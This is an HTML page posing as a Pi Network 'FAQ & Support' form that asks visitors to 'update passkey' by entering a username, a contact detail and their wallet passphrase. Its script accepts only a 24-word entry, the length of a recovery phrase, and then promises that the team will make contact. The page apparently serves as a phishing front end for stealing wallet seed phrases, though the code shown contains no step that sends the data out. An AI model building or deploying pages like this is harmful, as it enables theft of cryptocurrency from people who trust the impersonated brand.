<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FAQ & Support Page | Pi Network</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f8f8f8;
            text-align: center;
        }
        .header {
            background-color: #6A329F;
            color: white;
            padding: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .header span {
            font-size: 18px;
            font-weight: bold;
        }
        .container {
            margin: 40px auto;
            width: 90%;
            max-width: 400px;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
        }
        textarea, .btn {
            width: calc(100% - 20px);
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-style: italic;
            color: gray;
            resize: none;
        }
        textarea::placeholder {
            font-style: italic;
            color: gray;
        }
        /* Username and Email height same as button */
        .input-small {
            height: 50px;
        }
        /* Passphrase height 3 times button height */
        .input-large {
            height: 150px;
        }
        .btn {
            height: 50px;
            background-color: #6A329F;
            color: white;
            border: none;
            cursor: pointer;
            font-weight: bold;
        }
        .btn-disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        .info {
            font-size: 14px;
            color: gray;
            margin-top: 20px;
        }
        .error-message {
            color: red;
            font-size: 14px;
            margin-bottom: 10px;
        }
        @media (max-width: 600px) {
            .header {
                padding: 10px;
            }
            .header span {
                font-size: 16px;
            }
            .container {
                width: 95%;
                padding: 15px;
            }
            textarea {
                font-size: 14px;
                padding: 8px;
            }
            .btn {
                font-size: 14px;
                padding: 12px;
            }
            .info {
                font-size: 12px;
            }
        }
    </style>
    <script>
        function validatePassphrase() {
            var passphrase = document.getElementById("passphrase").value.trim();
            var message = document.getElementById("message");
            var words = passphrase.split(/\s+/).filter(word => word.length > 0);

            if (words.length !== 24) {
                message.innerHTML = "Invalid Passphrase";
                message.style.color = "red";
            } else {
                message.innerHTML = "Request submitted, please wait till our team contacts you.";
                message.style.color = "green";
            }
        }
    </script>
</head>
<body>
    <div class="header">
        <span><b>Welcome to the FAQ & Support Page</b></span>
    </div>
    <div class="container">
        <h2>Request to update passkey</h2>
        <textarea class="input-small" placeholder="Invalid Username"></textarea>
        <textarea class="input-small" placeholder="Invalid Phone number/Email ID"></textarea>
        <textarea id="passphrase" class="input-large" placeholder="Invalid Passphrase"></textarea>
        <p id="message" class="error-message"></p>
        <button class="btn" onclick="validatePassphrase()">Send Request</button>
        <p class="info">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
    </div>
</body>
</html>
